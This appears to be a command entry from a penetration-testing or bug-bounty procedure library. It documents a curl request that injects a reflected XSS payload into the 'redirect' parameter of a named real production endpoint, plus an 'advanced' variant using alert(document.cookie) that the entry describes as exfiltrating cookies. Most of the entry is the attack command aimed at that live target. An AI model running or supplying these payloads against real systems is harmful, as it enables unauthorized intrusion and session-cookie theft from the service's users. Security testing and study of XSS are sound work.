---
data: >-
  curl -X GET
  "https://watchdocs.indriverapp.com/webview/v1/refresh-jwt?redirect=%22%3E%3Cimg%20src=faw%20onerror=alert(1)%3E"
  -v
tags:
  - xss
  - web
  - testing
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-13T23:56:03.927Z'
id: 070af59b-e51f-4ad8-80d8-ab633dcd0be6
verified: false
validated: true
submitted: true
---
# access-vulnerable-xss-url

## Command

```bash
curl -X GET "https://watchdocs.indriverapp.com/webview/v1/refresh-jwt?redirect=%22%3E%3Cimg%20src=faw%20onerror=alert(1)%3E" -v
```

## Description

This command uses curl to send a GET request to the vulnerable endpoint with a reflected XSS payload in the 'redirect' parameter, allowing verification of the injection in the server response. While curl does not execute JavaScript, it helps inspect the reflected content for exploitation confirmation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X GET` | Specifies the HTTP method | Yes |
| `redirect=%22%3E%3Cimg%20src=faw%20onerror=alert(1)%3E` | URL-encoded payload injecting HTML/JS | Yes |
| `-v` | Verbose output to show headers and response | No |

## Examples

### Basic Usage

```bash
curl -X GET "https://watchdocs.indriverapp.com/webview/v1/refresh-jwt?redirect=%22%3E%3Cimg%20src=faw%20onerror=alert(1)%3E" -v
```

### Advanced Usage

```bash
curl -X GET "https://watchdocs.indriverapp.com/webview/v1/refresh-jwt?redirect=%22%3E%3Cimg%20src=faw%20onerror=alert(document.cookie)%3E" -v -o response.html
```

> Saves the response to a file for inspection, using a payload to exfiltrate cookies.

## Expected Output

Verbose curl output showing HTTP response headers, followed by the body containing the reflected payload like "> <img src=faw onerror=alert(1)>". Look for unescaped HTML in the response to confirm vulnerability.

## Related

- [[Related Procedure|procedures/Exploit-Reflected-XSS-in-Redirect-Parameter]]
